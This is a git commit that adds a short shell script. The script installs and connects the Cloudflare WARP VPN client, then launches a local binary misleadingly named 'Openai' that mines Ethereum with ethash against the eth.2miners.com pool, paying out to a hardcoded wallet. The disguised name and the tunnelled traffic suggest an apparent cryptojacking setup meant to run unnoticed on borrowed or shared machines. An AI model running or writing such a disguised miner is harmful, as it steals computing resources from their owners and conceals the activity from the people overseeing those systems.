a636278b284552d9ec775f149b8f68dfaa13818b
haidanglx <40859600+haidanglx@users.noreply.github.com>
2021-11-13 20:07:21 +0800

    Create cmd.sh

---
+++ cmd.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
+sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
+sudo systemctl enable --now warp-svc.service
+warp-cli set-mode warp+doh
+warp-cli register
+warp-cli enable-always-on
+warp-cli connect
+
+./Openai --algo ethash --server eth.2miners.com:2020 --user 0xcfEE82DA221E743051d71c24e6d0b75Bd094A819.sproxy
